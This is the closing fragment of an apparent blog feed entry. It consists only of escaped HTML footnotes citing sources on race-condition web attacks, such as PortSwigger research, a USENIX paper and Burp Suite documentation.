&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;research&#x2F;smashing-the-state-machine&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.usenix.org&#x2F;conference&#x2F;usenixsecurity20&#x2F;presentation&#x2F;van-goethem&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;3&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;3&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;aaltodoc.aalto.fi&#x2F;bitstream&#x2F;handle&#x2F;123456789&#x2F;47110&#x2F;master_Papli_Kaspar_2020.pdf&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;4&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;4&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Nagle%27s_algorithm&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;5&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;5&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitlab&#x2F;-&#x2F;commit&#x2F;e4d8d4f818275d42469d154b72fc6367b2b86bbb&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;6&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;7&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;baike.baidu.com&#x2F;item&#x2F;%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C&#x2F;1880992&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;7&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;8&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;25532384&#x2F;answer&#x2F;81152571&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;8&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;9&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;40211594&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;9&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;6&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;heartcombo&#x2F;devise&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;10&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;10&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;burp&#x2F;documentation&#x2F;desktop&#x2F;tools&#x2F;repeater&#x2F;send-group#sending-requests-in-parallel&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;11&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;11&lt;&#x2F;sup&gt;
&lt;p&gt;https:&#x2F;&#x2F;portswigger.net&#x2F;research&#x2F;smashing-the-state-machine#partial-construction&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
</content>
        
    </entry>
</feed>
